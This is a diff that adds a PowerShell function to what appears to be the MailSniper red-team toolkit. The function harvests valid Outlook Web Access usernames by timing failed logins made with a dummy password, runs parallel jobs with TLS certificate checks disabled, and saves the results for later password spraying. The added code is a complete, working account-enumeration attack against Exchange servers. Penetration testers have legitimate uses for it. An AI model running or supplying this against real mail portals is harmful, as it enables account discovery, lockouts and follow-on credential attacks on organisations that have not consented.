@@ -1323,3 +1323,196 @@ function LoadEWSDLL{
   Add-Type -Path $env:temp\ews.dll
 
 }
+
+function Invoke-UsernameHarvestOWA {
+<#
+  .SYNOPSIS
+
+    This module will attempt to connect to an Outlook Web Access portal and harvest valid usernames. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
+
+    MailSniper Function: Invoke-UsernameHarvestOWA
+    Author: Brian Fehrman (@fullmetalcache) and Beau Bullock (@dafthack) (mostly a copy and paste of Beau's Invoke-PasswordSpray OWA function)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+    .DESCRIPTION
+
+        This module will attempt to harvest useranmes from an Outlook Web Access portal. The module uses an anomaly where invalid usernames have a much greater response time than valid usernames, even if the password is invalid. The module uses a password that is likely to be invalid for all accounts. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
+
+    .PARAMETER ExchHostname
+
+        The hostname of the Exchange server to connect to.
+ 
+    .PARAMETER OutFile
+
+        Outputs the results to a text file.
+
+    .PARAMETER UserList
+
+        List of usernames 1 per line to to attempt to check for validity.
+
+    .PARAMETER Password
+
+        A single password to attempt a password spray with.
+
+    .PARAMETER Domain
+       
+        Domain name to prepend to usernames
+
+    .PARAMETER Threads
+       
+        Number of password spraying threads to run.
+
+  
+  .EXAMPLE
+
+    C:\PS> Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt
+
+    Description
+    -----------
+    This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to harvest a list of valid usernames by password spraying the provided list of usernames with a single password over 1 thread and write to a file called owa-valid-users.txt.
+
+#>
+  Param(
+
+
+    [Parameter(Position = 0, Mandatory = $True)]
+    [system.URI]
+    $ExchHostname = "",
+
+    [Parameter(Position = 1, Mandatory = $True)]
+    [string]
+    $OutFile = "",
+
+    [Parameter(Position = 2, Mandatory = $True)]
+    [string]
+    $UserList = "",
+
+    [Parameter(Position = 3, Mandatory = $False)]
+    [string]
+    $Password = "nowaythisisyourpassyo!",
+    
+    [Parameter(Position = 4, Mandatory = $False)]
+    [string]
+    $Domain = "",
+    
+    [Parameter(Position = 5, Mandatory = $False)]
+    [string]
+    $Threads = "5"
+
+  )
+    
+    Write-Host -ForegroundColor "yellow" "[*] Now spraying the OWA portal at https://$ExchHostname/owa/"
+    #Setting up URL's for later
+    $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
+    $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
+    
+    $Usernames = @()
+    $Usernames += Get-Content $UserList
+    $count = $Usernames.count
+    $sprayed = @()
+    $userlists = @{}
+    $count = 0 
+    
+    if ($Domain -ne "") {
+        $Domain = $Domain + "\"
+    }
+    
+    $Usernames |% {$userlists[$count % $Threads] += @($Domain + $_);$count++}
+
+    0..($Threads-1) |% {
+
+    Start-Job -ScriptBlock{
+
+    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
+    ## Code From http://poshcode.org/624
+
+    ## Create a compilation environment
+    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
+    $Compiler=$Provider.CreateCompiler()
+    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
+    $Params.GenerateExecutable=$False
+    $Params.GenerateInMemory=$True
+    $Params.IncludeDebugInformation=$False
+    $Params.ReferencedAssemblies.Add("System.DLL") > $null
+
+    $TASource=@'
+    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
+      public class TrustAll : System.Net.ICertificatePolicy {
+        public TrustAll() { 
+        }
+        public bool CheckValidationResult(System.Net.ServicePoint sp,
+          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
+          System.Net.WebRequest req, int problem) {
+          return true;
+        }
+      }
+    }
+'@ 
+    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
+    $TAAssembly=$TAResults.CompiledAssembly
+
+    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
+    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
+    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
+
+    $Password = $args[1]
+    $OWAURL2 = $args[2]
+    $OWAURL = $args[3]
+
+    $Users = @()
+
+    #This "primes" the username harvesting. Firstname in the list produces weird results, so use a throwaway
+    $Users += "throwaway1"
+
+    $Users += $args[0]
+
+    ## end code from http://poshcode.org/624
+    ForEach($Username in $Users)
+    {
+        #Logging into Outlook Web Access    
+        #Setting POST parameters for the login to OWA
+        $ProgressPreference = 'silentlycontinue'
+        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$Username";password="$Password";isUtf8='1'}
+        $Start = Get-Date
+        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
+        $TimeTaken = ((Get-Date) – $Start).TotalMilliseconds 
+        $out = $owalogin.RawContent
+        #Looking in the results for the OWA cadata cookie to determine whether authentication was successful or not.
+        if ($TimeTaken -le 700)
+        {
+            Write-Output "[*] Valid! User:$username"
+        }
+        $curr_user+=1 
+    }
+    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL | Out-Null
+
+}
+$Complete = Get-Date
+$MaxWaitAtEnd = 10000
+$SleepTimer = 200
+        $fullresults = @()
+While ($(Get-Job -State Running).count -gt 0){
+    $RunningJobs = ""
+    ForEach ($Job  in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
+    $RunningJobs = $RunningJobs.Substring(2)
+    Write-Progress  -Activity "Password Spraying the OWA portal at https://$ExchHostname/owa/. Sit tight..." -Status "$($(Get-Job -State Running).count) threads remaining" -PercentComplete ($(Get-Job -State Completed).count / $(Get-Job).count * 100)
+    If ($(New-TimeSpan $Complete $(Get-Date)).totalseconds -ge $MaxWaitAtEnd){"Killing all jobs still running . . .";Get-Job -State Running | Remove-Job -Force}
+    Start-Sleep -Milliseconds $SleepTimer
+    ForEach($Job in Get-Job){
+        $JobOutput = Receive-Job $Job
+        Write-Output $JobOutput
+        $fullresults += $JobOutput
+    }
+
+}
+
+    Write-Output ("[*] A total of " + $fullresults.count + " potentially valid usernames found.")
+    if ($OutFile -ne "")
+       {
+            $fullresults = $fullresults -replace '\[\*\] Valid! User:',''
+            $fullresults | Out-File -Encoding ascii $OutFile
+            Write-Output "Results have been written to $OutFile."
+       }
+}
